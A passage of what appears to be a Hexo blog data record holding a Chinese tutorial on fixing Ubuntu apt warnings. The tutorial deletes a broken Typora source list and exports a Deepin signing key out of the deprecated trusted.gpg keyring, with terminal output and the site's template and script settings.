https://dl.winehq.org/wine-builds/ubuntu focal InRelease                     \n命中:20 http://file.tickstep.com/apt aliyunpan InRelease \n已下载 3,765 kB，耗时 6秒 (654 kB/s)\n正在读取软件包列表... 完成\n正在分析软件包的依赖关系树... 完成\n正在读取状态信息... 完成                 \n有 11 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。\nknight@knight:~/nustarain$ \n```","slug":"Remove-aptkey","published":1,"updated":"2024-05-03T03:55:54.829Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5en003s7zj3fv0j28ch","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>在Ubuntu下载软件时，经常会安装一些存储秘钥，时间一长就会有一些过期的，不能用的，经常会在<code>apt udate</code>时进行检测，卡着很长时间，最后进行警告，非常浪费时间，而且对于强迫症患者来讲，提示警告和提示报错没什么区别，必须解决。</p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><ul>\n<li>报错信息</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">有 44 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。</span><br><span class=\"line\">W: https://community-store-packages.deepin.com/appstore/dists/eagle/InRelease: 密钥存储在过时的 trusted.gpg 密钥环中（/etc/apt/trusted.gpg），请参见 apt-key(8) 的 DEPRECATION 一节以了解详情。</span><br><span class=\"line\">W: 无法下载 https://typora.io/linux/./InRelease  Could not <span class=\"built_in\">wait</span> <span class=\"keyword\">for</span> server fd - select (11: 资源暂时不可用) [IP: 2a03:2880:f10d:183:face:b00c:0:25de 443]</span><br><span class=\"line\">W: 部分索引文件下载失败。如果忽略它们，那将转而使用旧的索引文件。</span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n\n<p>这一共有两个警告，第一个是提示有过期的存储秘钥，第二个是索引文件下载失败。</p>\n<ul>\n<li>解决索引文件下载失败</li>\n</ul>\n<p>注意索引文件的关键字有<code>typora</code>，进入存储索引文件的目录<code>/etc/apt/sources.list.d/</code>，把相关的文件直接删除即可。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">knight@knight:~/wechat$ <span class=\"built_in\">cd</span> /etc/apt/sources.list.d/</span><br><span class=\"line\">knight@knight:/etc/apt/sources.list.d$ <span class=\"built_in\">ls</span></span><br><span class=\"line\">deepin_appstore.list       google-chrome.list.save       typora.list       vscode.list.save</span><br><span class=\"line\">deepin_appstore.list.save  tickstep-aliyunpan.list       typora.list.save  winehq-focal.sources</span><br><span class=\"line\">google-chrome.list         tickstep-aliyunpan.list.save  vscode.list</span><br><span class=\"line\">knight@knight:/etc/apt/sources.list.d$ sudo <span class=\"built_in\">rm</span> -rf typora.list*</span><br><span class=\"line\">knight@knight:/etc/apt/sources.list.d$ <span class=\"built_in\">ls</span></span><br><span class=\"line\">deepin_appstore.list       google-chrome.list.save       vscode.list</span><br><span class=\"line\">deepin_appstore.list.save  tickstep-aliyunpan.list       vscode.list.save</span><br><span class=\"line\">google-chrome.list         tickstep-aliyunpan.list.save  winehq-focal.sources</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>解决有过期的存储秘钥</li>\n</ul>\n<p>解决完索引文件的问题之后，警告就变成了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">有 44 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。</span><br><span class=\"line\">W: https://community-store-packages.deepin.com/appstore/dists/eagle/InRelease: 密钥存储在过时的 trusted.gpg 密钥环中（/etc/apt/trusted.gpg），请参见 apt-key(8) 的 DEPRECATION 一节以了解详情。</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>首先先查看一下系统有多少存储秘钥</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">knight@knight:~/nustarain$ sudo apt-key list</span><br><span class=\"line\">[sudo] knight 的密码： </span><br><span class=\"line\">Warning: apt-key is deprecated. Manage keyring files <span class=\"keyword\">in</span> trusted.gpg.d instead (see apt-key(8)).</span><br><span class=\"line\">/etc/apt/trusted.gpg</span><br><span class=\"line\">--------------------</span><br><span class=\"line\">pub   rsa2048 2014-12-16 [SC]</span><br><span class=\"line\">      6BDB FE94 72C9 961F 4C19  73A1 4259 56BB 3E31 DF51</span><br><span class=\"line\">uid             [ 未知 ] pkg-builder &lt;pkg-builder@packages.linuxdeepin.com&gt;</span><br><span class=\"line\">sub   rsa2048 2014-12-16 [E]</span><br><span class=\"line\"></span><br><span class=\"line\">pub   rsa2048 2019-11-21 [SC]</span><br><span class=\"line\">      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB</span><br><span class=\"line\">uid             [ 未知 ] appstore (appstore key) &lt;appstore@deepin.com&gt;</span><br><span class=\"line\">sub   rsa2048 2019-11-21 [E]</span><br><span class=\"line\">sub   rsa2048 2019-11-21 [E]</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/apt/trusted.gpg.d/appstore.gpg</span><br><span class=\"line\">-----------------------------------</span><br><span class=\"line\">pub   rsa2048 2019-11-21 [SC]</span><br><span class=\"line\">      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB</span><br><span class=\"line\">uid             [ 未知 ] appstore (appstore key) &lt;appstore@deepin.com&gt;</span><br><span class=\"line\">sub   rsa2048 2019-11-21 [E]</span><br><span class=\"line\">sub   rsa2048 2019-11-21 [E]</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/apt/trusted.gpg.d/google-chrome.gpg</span><br><span class=\"line\">----------------------------------------</span><br><span class=\"line\">pub   rsa4096 2016-04-12 [SC]</span><br><span class=\"line\">      EB4C 1BFD 4F04 2F6D DDCC  EC91 7721 F63B D38B 4796</span><br><span class=\"line\">uid             [ 未知 ] Google Inc. (Linux Packages Signing Authority) &lt;linux-packages-keymaster@google.com&gt;</span><br><span class=\"line\">sub   rsa4096 2021-10-26 [S] [有效至：2024-10-25]</span><br><span class=\"line\">sub   rsa4096 2023-02-15 [S] [有效至：2026-02-14]</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/apt/trusted.gpg.d/microsoft.gpg</span><br><span class=\"line\">------------------------------------</span><br><span class=\"line\">pub   rsa2048 2015-10-28 [SC]</span><br><span class=\"line\">      BC52 8686 B50D 79E3 39D3  721C EB3E 94AD BE12 29CF</span><br><span class=\"line\">uid             [ 未知 ] Microsoft (Release signing) &lt;gpgsecurity@microsoft.com&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/apt/trusted.gpg.d/tickstep-packages-archive-keyring.gpg</span><br><span class=\"line\">------------------------------------------------------------</span><br><span class=\"line\">pub   rsa4096 2022-07-30 [SCEA]</span><br><span class=\"line\">      071D E06F 6BCE 212C 5483  CECF 3D4C 35B0 8026 4AA9</span><br><span class=\"line\">uid             [ 未知 ] tickstep &lt;tickstep@outlook.com&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg</span><br><span class=\"line\">------------------------------------------------------</span><br><span class=\"line\">pub   rsa4096 2012-05-11 [SC]</span><br><span class=\"line\">      8439 38DF 228D 22F7 B374  2BC0 D94A A3F0 EFE2 1092</span><br><span class=\"line\">uid             [ 未知 ] Ubuntu CD Image Automatic Signing Key (2012) &lt;cdimage@ubuntu.com&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg</span><br><span class=\"line\">------------------------------------------------------</span><br><span class=\"line\">pub   rsa4096 2018-09-17 [SC]</span><br><span class=\"line\">      F6EC B376 2474 EDA9 D21B  7022 8719 20D1 991B C93C</span><br><span class=\"line\">uid             [ 未知 ] Ubuntu Archive Automatic Signing Key (2018) &lt;ftpmaster@ubuntu.com&gt;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>可以看到有很多秘钥，然后在报错信息里面找关键字，发现有<code>deepin</code>关键字，然后使用 grep 查找，可以筛选出来，符合条件的就只有两个。</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/apt/trusted.gpg</span><br><span class=\"line\">--------------------</span><br><span class=\"line\">pub   rsa2048 2014-12-16 [SC]</span><br><span class=\"line\">      6BDB FE94 72C9 961F 4C19  73A1 4259 56BB 3E31 DF51</span><br><span class=\"line\">uid             [ 未知 ] pkg-builder &lt;pkg-builder@packages.linuxdeepin.com&gt;</span><br><span class=\"line\">sub   rsa2048 2014-12-16 [E]</span><br><span class=\"line\"></span><br><span class=\"line\">pub   rsa2048 2019-11-21 [SC]</span><br><span class=\"line\">      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB</span><br><span class=\"line\">uid             [ 未知 ] appstore (appstore key) &lt;appstore@deepin.com&gt;</span><br><span class=\"line\">sub   rsa2048 2019-11-21 [E]</span><br><span class=\"line\">sub   rsa2048 2019-11-21 [E]</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>将这两个秘钥逐一导出即可，导出时用到秘钥的后8位作为标记（去掉空格）。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">knight@knight:/etc/apt/trusted.gpg.d$ sudo apt-key <span class=\"built_in\">export</span> 0A53D5BB | sudo gpg --dearmour -o /etc/apt/trusted.gpg.d/appstore.gpg</span><br><span class=\"line\">Warning: apt-key is deprecated. Manage keyring files <span class=\"keyword\">in</span> trusted.gpg.d instead (see apt-key(8)).</span><br></pre></td></tr></table></figure>\n\n<p>上面这条命令的意思是：导出秘钥后8位为<code>0A53D5BB</code>的秘钥，导出到<code>/etc/apt/trusted.gpg.d/</code>目录下，并且命名为<code>appstore.gpg</code>。</p>\n<p>然后去存储秘钥的目录下验证，发现存在这样的一个文件。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">knight@knight:/etc/apt/trusted.gpg.d$ <span class=\"built_in\">ls</span> /etc/apt/trusted.gpg.d/</span><br><span class=\"line\">appstore.gpg       microsoft.gpg                          ubuntu-keyring-2012-cdimage.gpg</span><br><span class=\"line\">google-chrome.gpg  tickstep-packages-archive-keyring.gpg  ubuntu-keyring-2018-archive.gpg</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>最后，<code>sudo apt-key list</code>查看导出的秘钥并不会消失，但是执行<code>sudo apt update</code>不会再报警告了。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">获取:18 http://mirrors.aliyun.com/ubuntu jammy-security/universe amd64 DEP-11 Metadata [39.9 kB] </span><br><span class=\"line\">命中:19 https://dl.winehq.org/wine-builds/ubuntu focal InRelease                     </span><br><span class=\"line\">命中:20 http://file.tickstep.com/apt aliyunpan InRelease </span><br><span class=\"line\">已下载 3,765 kB，耗时 6秒 (654 kB/s)</span><br><span class=\"line\">正在读取软件包列表... 完成</span><br><span class=\"line\">正在分析软件包的依赖关系树... 完成</span><br><span class=\"line\">正在读取状态信息... 完成                 </span><br><span class=\"line\">有 11 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。</span><br><span class=\"line\">knight@knight:~/nustarain$ </span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>在Ubuntu下载软件时，经常会安装一些存储秘钥，时间一长就会有一些过期的，不能用的，经常会在<code>apt udate</code>时进行检测，卡着很长时间，最后进行警告，非常浪费时间，而且对于强迫症患者来讲，提示警告和提示报错没什么区别，必须解决。</p>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><ul>\n<li>报错信息</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">有 44 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。</span><br><span class=\"line\">W: https://community-store-packages.deepin.com/appstore/dists/eagle/InRelease: 密钥存储在过时的 trusted.gpg 密钥环中（/etc/apt/trusted.gpg），请参见 apt-key(8) 的 DEPRECATION 一节以了解详情。</span><br><span class=\"line\">W: 无法下载 https://typora.io/linux/./InRelease  Could not <span class=\"built_in\">wait</span> <span class=\"keyword\">for</span> server fd - select (11: 资源暂时不可用) [IP: 2a03:2880:f10d:183:face:b00c:0:25de 443]</span><br><span class=\"line\">W: 部分索引文件下载失败。如果忽略它们，那将转而使用旧的索引文件。</span><br></pre></td></tr></table></figure>","more":"<p>这一共有两个警告，第一个是提示有过期的存储秘钥，第二个是索引文件下载失败。</p>\n<ul>\n<li>解决索引文件下载失败</li>\n</ul>\n<p>注意索引文件的关键字有<code>typora</code>，进入存储索引文件的目录<code>/etc/apt/sources.list.d/</code>，把相关的文件直接删除即可。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">knight@knight:~/wechat$ <span class=\"built_in\">cd</span> /etc/apt/sources.list.d/</span><br><span class=\"line\">knight@knight:/etc/apt/sources.list.d$ <span class=\"built_in\">ls</span></span><br><span class=\"line\">deepin_appstore.list       google-chrome.list.save       typora.list       vscode.list.save</span><br><span class=\"line\">deepin_appstore.list.save  tickstep-aliyunpan.list       typora.list.save  winehq-focal.sources</span><br><span class=\"line\">google-chrome.list         tickstep-aliyunpan.list.save  vscode.list</span><br><span class=\"line\">knight@knight:/etc/apt/sources.list.d$ sudo <span class=\"built_in\">rm</span> -rf typora.list*</span><br><span class=\"line\">knight@knight:/etc/apt/sources.list.d$ <span class=\"built_in\">ls</span></span><br><span class=\"line\">deepin_appstore.list       google-chrome.list.save       vscode.list</span><br><span class=\"line\">deepin_appstore.list.save  tickstep-aliyunpan.list       vscode.list.save</span><br><span class=\"line\">google-chrome.list         tickstep-aliyunpan.list.save  winehq-focal.sources</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>解决有过期的存储秘钥</li>\n</ul>\n<p>解决完索引文件的问题之后，警告就变成了：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">有 44 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。</span><br><span class=\"line\">W: https://community-store-packages.deepin.com/appstore/dists/eagle/InRelease: 密钥存储在过时的 trusted.gpg 密钥环中（/etc/apt/trusted.gpg），请参见 apt-key(8) 的 DEPRECATION 一节以了解详情。</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>首先先查看一下系统有多少存储秘钥</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">knight@knight:~/nustarain$ sudo apt-key list</span><br><span class=\"line\">[sudo] knight 的密码： </span><br><span class=\"line\">Warning: apt-key is deprecated. Manage keyring files <span class=\"keyword\">in</span> trusted.gpg.d instead (see apt-key(8)).</span><br><span class=\"line\">/etc/apt/trusted.gpg</span><br><span class=\"line\">--------------------</span><br><span class=\"line\">pub   rsa2048 2014-12-16 [SC]</span><br><span class=\"line\">      6BDB FE94 72C9 961F 4C19  73A1 4259 56BB 3E31 DF51</span><br><span class=\"line\">uid             [ 未知 ] pkg-builder &lt;pkg-builder@packages.linuxdeepin.com&gt;</span><br><span class=\"line\">sub   rsa2048 2014-12-16 [E]</span><br><span class=\"line\"></span><br><span class=\"line\">pub   rsa2048 2019-11-21 [SC]</span><br><span class=\"line\">      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB</span><br><span class=\"line\">uid             [ 未知 ] appstore (appstore key) &lt;appstore@deepin.com&gt;</span><br><span class=\"line\">sub   rsa2048 2019-11-21 [E]</span><br><span class=\"line\">sub   rsa2048 2019-11-21 [E]</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/apt/trusted.gpg.d/appstore.gpg</span><br><span class=\"line\">-----------------------------------</span><br><span class=\"line\">pub   rsa2048 2019-11-21 [SC]</span><br><span class=\"line\">      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB</span><br><span class=\"line\">uid             [ 未知 ] appstore (appstore key) &lt;appstore@deepin.com&gt;</span><br><span class=\"line\">sub   rsa2048 2019-11-21 [E]</span><br><span class=\"line\">sub   rsa2048 2019-11-21 [E]</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/apt/trusted.gpg.d/google-chrome.gpg</span><br><span class=\"line\">----------------------------------------</span><br><span class=\"line\">pub   rsa4096 2016-04-12 [SC]</span><br><span class=\"line\">      EB4C 1BFD 4F04 2F6D DDCC  EC91 7721 F63B D38B 4796</span><br><span class=\"line\">uid             [ 未知 ] Google Inc. (Linux Packages Signing Authority) &lt;linux-packages-keymaster@google.com&gt;</span><br><span class=\"line\">sub   rsa4096 2021-10-26 [S] [有效至：2024-10-25]</span><br><span class=\"line\">sub   rsa4096 2023-02-15 [S] [有效至：2026-02-14]</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/apt/trusted.gpg.d/microsoft.gpg</span><br><span class=\"line\">------------------------------------</span><br><span class=\"line\">pub   rsa2048 2015-10-28 [SC]</span><br><span class=\"line\">      BC52 8686 B50D 79E3 39D3  721C EB3E 94AD BE12 29CF</span><br><span class=\"line\">uid             [ 未知 ] Microsoft (Release signing) &lt;gpgsecurity@microsoft.com&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/apt/trusted.gpg.d/tickstep-packages-archive-keyring.gpg</span><br><span class=\"line\">------------------------------------------------------------</span><br><span class=\"line\">pub   rsa4096 2022-07-30 [SCEA]</span><br><span class=\"line\">      071D E06F 6BCE 212C 5483  CECF 3D4C 35B0 8026 4AA9</span><br><span class=\"line\">uid             [ 未知 ] tickstep &lt;tickstep@outlook.com&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg</span><br><span class=\"line\">------------------------------------------------------</span><br><span class=\"line\">pub   rsa4096 2012-05-11 [SC]</span><br><span class=\"line\">      8439 38DF 228D 22F7 B374  2BC0 D94A A3F0 EFE2 1092</span><br><span class=\"line\">uid             [ 未知 ] Ubuntu CD Image Automatic Signing Key (2012) &lt;cdimage@ubuntu.com&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">/etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg</span><br><span class=\"line\">------------------------------------------------------</span><br><span class=\"line\">pub   rsa4096 2018-09-17 [SC]</span><br><span class=\"line\">      F6EC B376 2474 EDA9 D21B  7022 8719 20D1 991B C93C</span><br><span class=\"line\">uid             [ 未知 ] Ubuntu Archive Automatic Signing Key (2018) &lt;ftpmaster@ubuntu.com&gt;</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>可以看到有很多秘钥，然后在报错信息里面找关键字，发现有<code>deepin</code>关键字，然后使用 grep 查找，可以筛选出来，符合条件的就只有两个。</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/apt/trusted.gpg</span><br><span class=\"line\">--------------------</span><br><span class=\"line\">pub   rsa2048 2014-12-16 [SC]</span><br><span class=\"line\">      6BDB FE94 72C9 961F 4C19  73A1 4259 56BB 3E31 DF51</span><br><span class=\"line\">uid             [ 未知 ] pkg-builder &lt;pkg-builder@packages.linuxdeepin.com&gt;</span><br><span class=\"line\">sub   rsa2048 2014-12-16 [E]</span><br><span class=\"line\"></span><br><span class=\"line\">pub   rsa2048 2019-11-21 [SC]</span><br><span class=\"line\">      1D54 8EFE B9FA 97F2 FFEC  C7FE 1C30 362C 0A53 D5BB</span><br><span class=\"line\">uid             [ 未知 ] appstore (appstore key) &lt;appstore@deepin.com&gt;</span><br><span class=\"line\">sub   rsa2048 2019-11-21 [E]</span><br><span class=\"line\">sub   rsa2048 2019-11-21 [E]</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>将这两个秘钥逐一导出即可，导出时用到秘钥的后8位作为标记（去掉空格）。</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">knight@knight:/etc/apt/trusted.gpg.d$ sudo apt-key <span class=\"built_in\">export</span> 0A53D5BB | sudo gpg --dearmour -o /etc/apt/trusted.gpg.d/appstore.gpg</span><br><span class=\"line\">Warning: apt-key is deprecated. Manage keyring files <span 